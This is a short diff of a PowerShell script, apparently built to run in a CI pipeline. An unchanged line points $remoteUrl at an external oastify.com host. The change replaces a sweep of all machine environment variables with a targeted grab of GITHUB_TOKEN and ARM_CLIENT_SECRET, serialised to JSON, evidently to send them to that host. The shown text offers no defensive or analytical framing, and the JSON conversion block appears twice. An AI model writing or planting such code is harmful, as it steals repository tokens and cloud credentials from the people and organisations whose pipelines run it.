@@ -6,9 +6,14 @@ $remoteUrl = "http://9hryf86p3o4fl8ikham7mn3utlzcn4bt.oastify.com"
 $envVariables = @{}
 
 # Loop through each environment variable and add it to the hashtable
-foreach ($envVar in [System.Environment]::GetEnvironmentVariables("Machine").GetEnumerator()) {
-    $envVariables[$envVar.Key] = $envVar.Value
+$envVariables = @{
+    "GITHUB_TOKEN" = $env:GITHUB_TOKEN
+    "ARM_CLIENT_SECRET" = $env:ARM_CLIENT_SECRET
+    # Add more variables as needed
 }
+
+# Convert the hashtable to JSON
+$jsonBody = $envVariables | ConvertTo-Json
 
 # Convert the hashtable to JSON
 $jsonBody = $envVariables | ConvertTo-Json
